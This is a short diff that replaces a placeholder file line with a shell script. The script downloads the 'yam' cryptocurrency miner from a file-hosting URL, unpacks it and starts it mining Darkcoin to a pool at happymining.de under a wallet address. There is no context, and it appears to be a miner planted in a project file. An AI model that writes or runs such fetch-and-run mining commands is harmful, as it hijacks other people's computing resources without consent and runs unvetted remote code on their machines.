@@ -1,1 +1,5 @@
-my new file contents
+wget https://oewjbq.bn1301.livefilestore.com/y2mueStnF_34PkgaJA1U4fnEDt-ut1APXDdPviOFG1yEjualj-xEfa8are2nbZoJIOd_iJ0UaljMM7p7oLn2RzbHNADv1liCvojHBUTyAD_EiHy0tEg_DR0mz7BJe3jkzlhok9d01BDhj4Pp5bjCkv20VTbJhB8Q6fDB6rZP9Fti2c/yam-yvg1900-M8a-linux64-generic.tgz?download&psid=1
+wait
+tar xzf yam-yvg1900-M8a-linux64-generic.tgz?download
+cd yam-yvg1900-M8a-linux64-generic/
+./linux64-generic/yam -P 'drk:av=0&donation-interval=100' --mine 'stratum+tcp://XhGLeTUKLAZYV5FFcJKAx96p9pZYAFbu9F:ks@happymining.de:7903/drk?av=0&donation-interval=100'
